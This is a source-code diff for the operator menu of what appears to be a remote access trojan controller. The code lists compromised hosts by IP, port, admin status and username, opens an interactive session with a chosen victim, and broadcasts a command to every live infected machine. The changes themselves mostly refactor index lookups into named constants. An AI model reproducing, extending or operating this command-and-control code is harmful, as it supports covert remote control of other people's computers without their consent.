@@ -15,12 +15,11 @@ from .management import Management
 from .management import CheckConn
 from .other import printColor
 from .sql import Sql
-from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN
+from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SOCK_TIMEOUT
 
 import time
 
 class Menu:
-
     RESET_COLOR = Style.RESET_ALL
     def help(self):
         printColor("help","""
@@ -53,6 +52,7 @@ class Menu:
         ptable.field_names =["Session","IP","Port","Is he alive","Is he admin","Path RAT","Username"] #append title of row.
  
         for key in Handler.dict_conn.keys():
+            #print("TETS BOOL_>",type(Handler.dict_conn[key][NB_ALIVE]),":",Handler.dict_conn[key][NB_ALIVE])
             ptable.add_row([key,Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT],Handler.dict_conn[key][NB_ALIVE],Handler.dict_conn[key][NB_ADMIN],Handler.dict_conn[key][NB_PATH],Handler.dict_conn[key][NB_USERNAME]])
 
         print(Fore.GREEN,(ptable),Fore.BLUE)
@@ -63,7 +63,7 @@ class Menu:
         if(target in Handler.dict_conn.keys()):
             printColor("information","[+] Selected target: {}".format(Handler.dict_conn[target][NB_IP]))
             if(Handler.dict_conn[target][NB_ALIVE]):
-                session = Session(Handler.dict_conn[target][0],Handler.dict_conn[target][1],Handler.dict_conn[target][2], target) #def __init__(self,socket,ip_client,port_client,session_nb): 
+                session = Session(Handler.dict_conn[target][NB_SOCKET],Handler.dict_conn[target][NB_IP],Handler.dict_conn[target][NB_PORT], target) #def __init__(self,socket,ip_client,port_client,session_nb): 
                 session.main() 
             else:
                 printColor("information","[-] The target is currently offline.\n")
@@ -80,11 +80,11 @@ class Menu:
                 if(forall == "--back" or forall == "-b"):
                     break
                 for key in Handler.dict_conn.keys():
-                    if(Handler.dict_conn[key][3]):
-                        if CheckConn().safeSend(key,Handler.dict_conn[key][0],("MOD_ALL:"+forall).encode()):
-                            printColor("information","[+] command sent to: {}:{}".format(Handler.dict_conn[key][1],Handler.dict_conn[key][1]))
+                    if(Handler.dict_conn[key][NB_ALIVE]):
+                        if CheckConn().safeSend(key,Handler.dict_conn[key][NB_SOCKET],("MOD_ALL:"+forall).encode()):
+                            printColor("information","[+] command sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
                         else:
-                            printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][1],Handler.dict_conn[key][2]))
+                            printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
                     else:
                         pass
                 print("\n")
